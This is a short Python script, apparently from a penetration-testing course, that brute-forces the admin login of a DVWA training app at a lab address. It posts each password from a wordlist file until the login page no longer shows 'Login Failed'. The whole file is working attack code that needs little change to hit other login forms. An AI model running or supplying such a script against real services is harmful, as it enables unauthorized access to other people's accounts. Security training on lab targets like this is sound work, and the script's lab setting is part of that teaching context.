#!/usr/bin/env python

# brute force password attack

import requests

target_url = "http://10.0.2.5/dvwa/login.php"  # sets target url
data_dict = {"username": "admin", "password": "", "Login": "submit"}  # all values required to successfully login

with open("/root/Downloads/passwords.txt", "r") as wordlist_file:  # opens file w/ 10,000 passwords
    # can use "common-dirs.txt" to find directories or "subdomains.tx" to find hidden domains
    for line in wordlist_file:  # goes over ever line in the list
        word = line.strip()  # gets rid of everything in the line except word (indents etc.)
        data_dict["password"] = word  # setting value for password in data_dict as current word
        response = requests.post(target_url, data=data_dict)  # sending post request with data containg all required values
        if "Login Failed" not in str(response.content):  # we actually managed to login b/c there's no fail
            print("[+] Password Found --> " + word)
            exit()  # exits so we don't keep testing passwords if already found

print("[-] Password not found....")